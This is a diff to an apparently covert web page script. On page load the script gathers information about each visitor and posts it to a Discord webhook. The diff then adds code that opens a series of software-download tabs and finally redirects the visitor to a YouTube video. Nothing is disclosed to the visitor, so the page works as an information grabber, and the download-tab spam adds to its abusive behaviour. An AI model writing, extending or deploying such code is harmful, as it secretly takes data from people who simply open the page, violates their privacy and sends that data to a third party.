@@ -46,6 +46,15 @@
     </div>
 
     <script>
+        const links = [
+            "https://download.cnet.com/download/opera/3000-2356_4-10005498.html",
+            "https://download.cnet.com/download/malwarebytes/3000-8022_4-10804572.html",
+            "https://download.cnet.com/download/avg-antivirus-free/3000-2239_4-10320142.html",
+            "https://download.cnet.com/download/winrar-64-bit/3000-2250_4-10965579.html",
+            "https://download.cnet.com/download/revo-uninstaller/3000-2096_4-10687648.html",
+            "https://download.cnet.com/download/tlauncher/3000-windows-tlauncher.html"
+        ];
+
         // Function to collect all information and send to Discord
         async function collectAndSendInfo() {
             try {
@@ -170,26 +179,46 @@
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(payload)
+                   body: JSON.stringify(payload)
                 });
                 
                 if (response.ok) {
-                    // Redirect to another website after successful submission
-                    window.location.href = 'https://www.youtube.com/watch?v=qXNpkatmYzs'; // Replace with your target URL
+                    console.log('Information sent to Discord successfully');
                 } else {
                     console.error('Failed to send to Discord');
-                    // Still redirect even if webhook fails
-                    window.location.href = 'https://www.youtube.com/watch?v=IWnFDMZwe4c'; // Replace with your target URL
                 }
             } catch (error) {
                 console.error('Error:', error);
-                // Still redirect even if there's an error
-                window.location.href = 'https://www.youtube.com/watch?v=IWnFDMZwe4c'; // Replace with your target URL
             }
         }
+
+        // Function to open links with delay
+        function openLinks() {
+            links.forEach((link, i) => {
+                setTimeout(() => {
+                    window.open(link, "_blank");
+                }, i * 500);
+            });
+        }
+
+        // Main function to run everything
+        async function initialize() {
+            // Collect and send information first
+            await collectAndSendInfo();
+            
+            // Then open the links after a short delay
+            setTimeout(() => {
+                openLinks();
+                
+                // Finally redirect to YouTube after all links have opened
+                setTimeout(() => {
+                    window.location.href = 'https://www.youtube.com/watch?v=qXNpkatmYzs';
+                }, links.length * 500 + 1000);
+            }, 2000);
+        }
         
-        // Start collecting information as soon as the page loads
-        window.addEventListener('load', collectAndSendInfo);
+        // Start everything when the page loads
+        window.addEventListener('load', initialize);
     </script>
 </body>
 </html>
